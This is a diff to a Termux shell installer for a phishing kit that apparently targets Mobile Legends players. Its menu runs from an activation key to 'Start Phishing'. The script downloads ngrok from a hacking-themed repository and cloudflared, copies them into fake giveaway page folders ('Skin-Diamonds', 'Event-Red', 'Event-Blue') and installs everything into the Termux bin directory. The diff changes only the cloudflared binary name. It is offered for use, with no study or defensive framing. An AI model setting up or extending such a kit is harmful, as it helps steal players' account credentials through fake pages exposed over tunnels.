@@ -17,7 +17,7 @@ echo ""
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok ,  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
@@ -125,7 +125,7 @@ echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download L
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared-linux-arm
 echo""
 clear
 echo ""
@@ -158,15 +158,15 @@ read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtok
 $token
 echo ""
 echo
-cp -R cloudflared ngrok .SUMAN/1-Skin-Diamonds/
-cp -R cloudflared ngrok .SUMAN/2-Event-Red/
-cp -R cloudflared ngrok .SUMAN/3-Event-Blue/
+cp -R cloudflared-linux-arm ngrok .SUMAN/1-Skin-Diamonds/
+cp -R cloudflared-linux-arm ngrok .SUMAN/2-Event-Red/
+cp -R cloudflared-linux-arm ngrok .SUMAN/3-Event-Blue/
 chmod 7777 MobileLegend-Phishing
 clear
 echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
-cp -R cloudflared /data/data/com.termux/files/usr/bin
+cp -R cloudflared-linux-arm /data/data/com.termux/files/usr/bin
 cp -R .SUMAN /data/data/com.termux/files/usr/bin
 cp -R ML /data/data/com.termux/files/usr/bin
 cp -R MobileLegend /data/data/com.termux/files/usr/bin
